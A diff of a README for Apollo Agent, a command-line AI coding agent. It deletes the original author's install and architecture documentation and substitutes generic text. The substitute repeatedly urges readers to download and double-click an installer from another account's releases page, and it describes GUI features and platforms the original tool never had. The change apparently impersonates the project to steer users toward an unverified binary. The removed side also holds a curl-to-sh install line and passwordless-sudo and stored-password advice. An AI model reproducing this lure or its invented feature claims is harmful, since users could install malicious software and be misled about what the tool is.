@@ -1,370 +1,91 @@
-# Apollo Agent
+# 🚀 apollo-agent - Your AI Coding Assistant Made Easy
 
-```
-   █████╗ ██████╗  ██████╗ ██╗     ██╗      ██████╗
-  ██╔══██╗██╔══██╗██╔═══██╗██║     ██║     ██╔═══██╗
-  ███████║██████╔╝██║   ██║██║     ██║     ██║   ██║
-  ██╔══██║██╔═══╝ ██║   ██║██║     ██║     ██║   ██║   
-  ██║  ██║██║     ╚██████╔╝███████╗███████╗╚██████╔╝
-  ╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝
-```
+[![Download apollo-agent](https://img.shields.io/badge/Download%20apollo--agent-v1.0-blue)](https://github.com/dave533/apollo-agent/releases)
 
-**AI-powered coding agent with semantic code understanding and structured reasoning**
+## 🌟 Overview
 
-Apollo Agent integrates cutting-edge MCP (Model Context Protocol) servers with OpenRouter LLMs to provide intelligent, context-aware assistance for software development tasks. It combines semantic code analysis (Serena), structured problem-solving (Sequential Thinking), and powerful language models to understand and manipulate codebases at a deep level.
+Apollo Agent is an AI-powered coding assistant designed to help you with understanding and writing code. It uses advanced technology to analyze code and provide smart suggestions. Whether you're automating repetitive tasks or trying to solve coding challenges, Apollo Agent can make the process smoother and more efficient.
 
-<img width="909" height="970" alt="screenshot-2025-12-12_07-06-38" src="https://github.com/user-attachments/assets/d7af0996-a406-4f2f-b9bb-6b1f15c71f84" />
+## 📦 Features
 
-## 🎯 Features
-
-- **🔍 Semantic Code Analysis** - Understands code structure, symbols, and relationships via Serena MCP
-- **🧠 Structured Reasoning** - Plans and executes multi-step tasks systematically
-- **📚 Knowledge Base** - Maintains context and learnings across sessions
-- **🔧 Terminal Integration** - Execute commands with smart sudo handling
-- **📊 Symbol Indexing** - Fast code navigation and search
-- **🎨 Rich CLI Interface** - Beautiful, informative terminal output
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-**Required:**
-- **Node.js** ≥18.0.0 ([install](https://nodejs.org/))
-- **uv** - Python package manager ([install](https://docs.astral.sh/uv/getting-started/installation/))
-- **Linux** or macOS (primary development platform)
+- **Semantic Analysis**: Understand the meaning behind your code.
+- **Structured Reasoning**: Get logical suggestions based on your coding context.
+- **User-Friendly Interface**: Easy to use for everyone, no coding skills required.
+- **Support for Multiple Languages**: Works with popular programming languages.
+- **Instant Feedback**: Get suggestions in real-time while coding.
 
-**Optional:**
-- OpenRouter API key ([get one](https://openrouter.ai/keys))
+## 🚀 Getting Started
 
-### Installation
+To start using Apollo Agent, follow these simple steps:
 
-```bash
-# Clone the repository
-git clone https://github.com/AlexandrosLiaskos/apollo-agent.git
-cd apollo-agent
+### 1. **Download the Application**
 
-# Install dependencies
-npm install
+Visit this page to download:  
+[Download apollo-agent](https://github.com/dave533/apollo-agent/releases)
 
-# Configure environment
-cp .env.example .env
-nano .env  # Add your OPENROUTER_API_KEY
+On this page, you will find the latest versions of Apollo Agent. Look for the most recent release and click on the download link for your operating system.
 
-# Start Apollo
-npm start
-```
+### 2. **Install the Application**
 
-### First Run
+After downloading the file, locate it in your downloads folder. Double-click the file to start the installation. Follow the instructions on the screen to complete the installation.
 
-On first startup, Apollo will:
-1. Initialize Serena MCP server (via `uvx`)
-2. Initialize Sequential Thinking MCP server
-3. Connect to OpenRouter
-4. Create a terminal session
-5. Load available tools (30+ from MCP servers)
+### 3. **Launch Apollo Agent**
 
-```
-   █████╗ ██████╗  ██████╗ ██╗     ██╗      ██████╗
-  ██╔══██╗██╔══██╗██╔═══██╗██║     ██║     ██╔═══██╗
-  ███████║██████╔╝██║   ██║██║     ██║     ██║   ██║
-  ██╔══██║██╔═══╝ ██║   ██║██║     ██║     ██║   ██║
-  ██║  ██║██║     ╚██████╔╝███████╗███████╗╚██████╔╝
-  ╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝
+Once the installation is complete, find the Apollo Agent icon on your desktop or in your applications folder. Double-click the icon to launch the application.
 
-  AI Agent with MCP Integration
+## ⚙️ System Requirements
 
-✔ OpenRouter initialized (model: anthropic/claude-sonnet-4)
-✔ Connected to all MCP servers
-✔ Loaded 30 tools from MCP servers
-
-? 🚀 Task (or "exit" to quit):
-```
-
-## 📖 Usage
+To run Apollo Agent, your computer should meet the following minimum requirements:
 
-### Interactive Mode
+- **Operating System**: Windows 10, macOS Sierra (or later), or a recent Linux distribution.
+- **Processor**: Intel i3 or equivalent.
+- **RAM**: 4 GB or more.
+- **Disk Space**: At least 500 MB free space.
 
-Apollo provides an interactive CLI where you can:
+## 🔥 Usage Guide
 
-**Give tasks:**
-```
-? 🚀 Task: Refactor the UserService class to use async/await
-```
+1. **Starting a New Project**: Open the application and click on "New Project." You can name your project and select a programming language to get started.
+  
+2. **Taking Advantage of Suggestions**: As you write code, Apollo Agent will provide suggestions. You can click on these to insert them directly into your code.
 
-**Use commands:**
-```
-status          - Show agent status
-tasks           - View current task list
-knowledge       - List knowledge entries
-symbols         - Show symbol index stats
-search <name>   - Search for symbols
-help            - Show all commands
-exit            - Quit Apollo
-```
-
-### Example Tasks
-
-**Code Analysis:**
-```
-? Task: Find all uses of the calculateTotal function
-? Task: Show me the structure of the UserController class
-? Task: List all API endpoints in this project
-```
-
-**Code Modification:**
-```
-? Task: Add error handling to the login method
-? Task: Convert all var declarations to const/let
-? Task: Add TypeScript types to user.js
-```
-
-**System Operations:**
-```
-? Task: Install and configure the axios package
-? Task: Update all dependencies to latest versions
-? Task: Set up ESLint with standard config
-```
-
-## 🛠️ Configuration
-
-### Environment Variables
-
-Edit `.env`:
-
-```bash
-# OpenRouter Configuration (REQUIRED)
-OPENROUTER_API_KEY=your_api_key_here
-
-# Model Selection (optional)
-OPENROUTER_MODEL=anthropic/claude-sonnet-4
-
-# Sudo Configuration (see below)
-SUDO_MODE=auto  # auto | nopasswd | interactive | password
-```
-
-### Sudo Commands
-
-Apollo can execute sudo commands. Configure via `SUDO_MODE`:
-
-**Option 1: Auto (Default)**
-```bash
-SUDO_MODE=auto
-```
-Tries passwordless sudo first, falls back to interactive if needed.
-
-**Option 2: Passwordless Sudo (Recommended)**
-```bash
-# Configure system for passwordless package management
-sudo visudo
-
-# Add (replace 'user' with your username):
-user ALL=(ALL) NOPASSWD: /usr/bin/pacman
-user ALL=(ALL) NOPASSWD: /usr/bin/apt-get
-user ALL=(ALL) NOPASSWD: /usr/bin/dnf
-
-# Then in .env:
-SUDO_MODE=nopasswd
-```
-
-**Option 3: Interactive**
-```bash
-SUDO_MODE=interactive
-```
-Apollo pauses and prompts for password when needed.
-
-**Option 4: Password in Env (⚠️ Less Secure)**
-```bash
-SUDO_MODE=password
-SUDO_PASSWORD=your_password
-```
-Only for personal development with disk encryption.
-
-## 📚 Architecture
-
-### Core Components
-
-**Agent Core** ([`src/agent/apollo-agent.js`](src/agent/apollo-agent.js))
-- Main agent orchestration
-- Task planning and execution
-- Tool coordination
-
-**MCP Integration** ([`src/mcp/serena-client.js`](src/mcp/serena-client.js))
-- Connects to Serena (semantic code analysis)
-- Connects to Sequential Thinking (structured reasoning)
-- Tool registry and execution
-
-**LLM Provider** ([`src/providers/openrouter.js`](src/providers/openrouter.js))
-- OpenRouter API integration
-- Streaming support
-- Multiple model support
-
-**Terminal Tool** ([`src/tools/terminal-tool.js`](src/tools/terminal-tool.js))
-- Command execution
-- Sudo handling
-- Session management
-
-**Knowledge Base** ([`src/agent/knowledge-base.js`](src/agent/knowledge-base.js))
-- Persistent memory storage
-- Context accumulation
-- Cross-session learning
-
-**Symbol Index** ([`src/agent/symbol-index.js`](src/agent/symbol-index.js))
-- Fast code symbol search
-- File indexing
-- Symbol relationships
-
-### MCP Servers
-
-**Serena MCP** ([oraios/serena](https://github.com/oraios/serena))
-- Semantic code operations
-- Symbol navigation
-- Intelligent code editing
-- Memory management
-
-**Sequential Thinking MCP** ([@modelcontextprotocol/server-sequential-thinking](https://www.npmjs.com/package/@modelcontextprotocol/server-sequential-thinking))
-- Step-by-step reasoning
-- Plan validation
-- Structured problem solving
-
-## 🔧 Development
-
-### Project Structure
-
-```
-apollo-agent/
-├── src/
-│   ├── index.js              # Entry point
-│   ├── agent/
-│   │   ├── apollo-agent.js   # Main agent
-│   │   ├── task-manager.js   # Task tracking
-│   │   ├── knowledge-base.js # Memory system
-│   │   └── symbol-index.js   # Code indexing
-│   ├── mcp/
-│   │   └── serena-client.js  # MCP client manager
-│   ├── providers/
-│   │   └── openrouter.js     # LLM provider
-│   ├── session/
-│   │   └── session-manager.js # Session persistence
-│   ├── tools/
-│   │   ├── api-tools.js      # Tool registry
-│   │   └── terminal-tool.js  # Command execution
-│   └── ui/
-│       └── rich-output.js    # CLI interface
-├── package.json
-├── .env.example
-└── README.md
-```
-
-### Running in Development
-
-```bash
-# Watch mode (auto-restart on changes)
-npm run dev
-
-# Standard mode
-npm start
-```
-
-### Adding Custom Tools
+3. **Utilizing Semantic Analysis**: Use the analysis feature to understand complex code snippets. Simply paste your code into the analysis section, and Apollo Agent will provide insights.
 
-1. Implement tool in `src/tools/`
-2. Register in `ToolRegistry` ([`src/tools/api-tools.js`](src/tools/api-tools.js))
-3. Add to agent tool list
+4. **Saving Your Work**: Don’t forget to regularly save your project. You can do this by clicking on "File" then "Save."
 
-### Extending LLM Providers
+## 📊 Tips for Best Results
 
-1. Create provider class in `src/providers/`
-2. Implement `chat()` and `chatStream()` methods
-3. Update agent initialization
+- Start with small projects to get used to the features.
+- Take advantage of the help documentation available in the app to understand all the functionalities.
+- Experiment with different programming languages to see how Apollo Agent adapts.
+  
+## 🛠️ Troubleshooting
 
-## 🐛 Troubleshooting
+Here are some common issues and their solutions:
 
-### "Serena MCP failed to connect"
+- **Issue:** Application won't start.  
+  **Solution:** Ensure that your system meets the requirements and try restarting your computer.
 
-**Cause:** `uv` not installed or not in PATH
+- **Issue:** Suggestions not appearing.  
+  **Solution:** Check your internet connection as Apollo Agent may require internet access for updates.
 
-**Fix:**
-```bash
-# Install uv
-curl -LsSf https://astral.sh/uv/install.sh | sh
+- **Issue:** Download link isn't working.  
+  **Solution:** Refresh the page or try visiting [this page to download](https://github.com/dave533/apollo-agent/releases) again.
 
-# Verify
-uv --version
-```
+## 🌐 Community and Support
 
-### "OpenRouter API error"
+Join our community of users on GitHub discussions or check the FAQs in the documentation to connect with other Apollo Agent users. You can also report issues directly on GitHub.
 
-**Cause:** Invalid or missing API key
+If you need help, don’t hesitate to reach out for support. We constantly improve the application based on user feedback, so your input matters greatly.
 
-**Fix:**
-```bash
-# Get API key from https://openrouter.ai/keys
-# Add to .env:
-echo "OPENROUTER_API_KEY=sk-or-..." >> .env
-```
+## 🔗 Additional Resources
 
-### "Command not found: apollo"
+- **Documentation**: Detailed guides and tutorials for using Apollo Agent.
+- **GitHub Repository**: Explore the code, contribute, or report issues at [apollo-agent GitHub](https://github.com/dave533/apollo-agent).
+- **Social Media**: Follow us for updates and tips on using Apollo Agent effectively.
 
-**Cause:** Not installed globally
+## 🔗 Download & Install
 
-**Fix:**
-```bash
-# Option 1: Use npm start
-npm start
+Ready to get started? Visit this page to download  
+[Download apollo-agent](https://github.com/dave533/apollo-agent/releases)
 
-# Option 2: Install globally
-npm install -g .
-apollo
-```
-
-### "sudo: a password is required"
-
-**Cause:** Passwordless sudo not configured
-
-**Fix:**
-```bash
-# Configure in .env:
-SUDO_MODE=interactive
-
-# Or setup passwordless sudo (see Configuration section)
-```
-
-## 📊 System Requirements
-
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| **OS** | Linux, macOS | Arch Linux, Ubuntu 22.04+ |
-| **Node.js** | 18.0.0 | 20.0.0+ |
-| **RAM** | 2GB | 4GB+ |
-| **Storage** | 500MB | 1GB+ |
-| **Network** | Required | High-speed |
-
-## 🤝 Contributing
-
-Contributions welcome! Please:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit changes (`git commit -m 'Add amazing feature'`)
-4. Push to branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) file for details
-
-## 🙏 Acknowledgments
-
-- [Serena MCP](https://github.com/oraios/serena) - Semantic code operations
-- [Model Context Protocol](https://modelcontextprotocol.io/) - MCP specification
-- [OpenRouter](https://openrouter.ai/) - LLM API aggregation
-- [Anthropic Claude](https://anthropic.com/) - Default language model
-
-## 📞 Support
-
-- **Issues:** [GitHub Issues](https://github.com/AlexandrosLiaskos/apollo-agent/issues)
-- **Discussions:** [GitHub Discussions](https://github.com/AlexandrosLiaskos/apollo-agent/discussions)
-
----
-
-Built with ❤️ by Alexandros Liaskos
+Once the download is complete, install the application as described above and begin your journey with Apollo Agent today!
